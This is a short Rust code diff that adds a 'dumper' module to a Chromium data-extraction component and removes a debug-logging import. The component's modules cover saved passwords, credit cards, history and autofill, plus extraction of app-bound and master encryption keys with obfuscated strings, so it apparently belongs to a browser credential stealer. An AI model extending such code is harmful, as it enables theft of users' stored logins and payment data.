@@ -5,6 +5,7 @@ mod passwords;
 mod creditcards;
 mod downloads;
 mod history;
+mod dumper;
 
 use crate::chromium::autofill::AutoFillTask;
 use crate::chromium::bookmarks::BookmarksTask;
@@ -21,7 +22,6 @@ use alloc::vec::Vec;
 use obfstr::obfstr as s;
 use tasks::{composite_task, CompositeTask, Task};
 use utils::browsers::chromium::{extract_app_bound_encrypted_key, extract_master_key};
-use utils::log_debug;
 use utils::path::Path;
 
 pub struct ChromiumTask<'a> {
